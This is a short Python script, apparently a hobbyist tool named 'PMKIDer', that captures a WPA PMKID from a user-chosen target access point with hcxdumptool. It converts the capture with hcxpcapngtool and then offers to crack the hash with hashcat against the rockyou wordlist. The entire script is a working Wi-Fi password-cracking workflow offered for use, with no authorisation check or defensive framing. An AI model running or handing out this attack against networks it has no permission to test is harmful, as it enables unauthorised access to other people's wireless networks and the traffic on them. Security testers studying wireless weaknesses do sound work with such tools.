import os
import subprocess
from termcolor import colored

BANNER = """
██████╗ ███╗   ███╗██╗  ██╗██╗██████╗ ███████╗██████╗ 
██╔══██╗████╗ ████║██║ ██╔╝██║██╔══██╗██╔════╝██╔══██╗
██████╔╝██╔████╔██║█████╔╝ ██║██║  ██║█████╗  ██████╔╝
██╔═══╝ ██║╚██╔╝██║██╔═██╗ ██║██║  ██║██╔══╝  ██╔══██╗
██║     ██║ ╚═╝ ██║██║  ██╗██║██████╔╝███████╗██║  ██║
╚═╝     ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
               developed by 0xissam                                                   
"""

def run_command(cmd):
    try:
        subprocess.check_call(cmd)
    except subprocess.CalledProcessError:
        return False
    return True

def main():
    os.system("clear")
    print(colored(BANNER, "green"))

    interface = input(colored("[+] Enter the interface on monitor mode: ", "green")).strip()
    mac = input(colored("[+] Enter the MAC address of the target: ", "green")).strip()
    print("")

    with open("bssid", "w") as f:
        new_mac = mac.replace(":", "")
        f.write(new_mac)

    try:
        if not run_command(["hcxdumptool", "-o", "pmkid.pcapng", "-i", interface, "--enable_status=1", "--filterlist_ap=bssid", "--filtermode=2"]):
            raise KeyboardInterrupt()
    except KeyboardInterrupt:
        os.remove("bssid")
        print(colored("\n[+] Exit", "green"))
        return

    run_command(["hcxpcapngtool", "-o", "hash.hc22000", "pmkid.pcapng"])
    os.remove("pmkid.pcapng")

    cheke = input(colored("[+] Do you want to crack the hash? (y/n): ", "green")).strip().lower()
    print("")

    if cheke == "n":
        print(colored("[+] Exit", "green"))
        return
    elif cheke == "y":
        if not run_command(["hashcat", "-m", "22000", "hash.hc22000", "/usr/share/wordlists/rockyou.txt"]):
            print(colored("\n[+] Exit", "green"))
            return
    else:
        print(colored("[+] Check your input, something went wrong!", "green"))

    print(colored("[+] Exit", "green"))

if __name__ == "__main__":
    main()
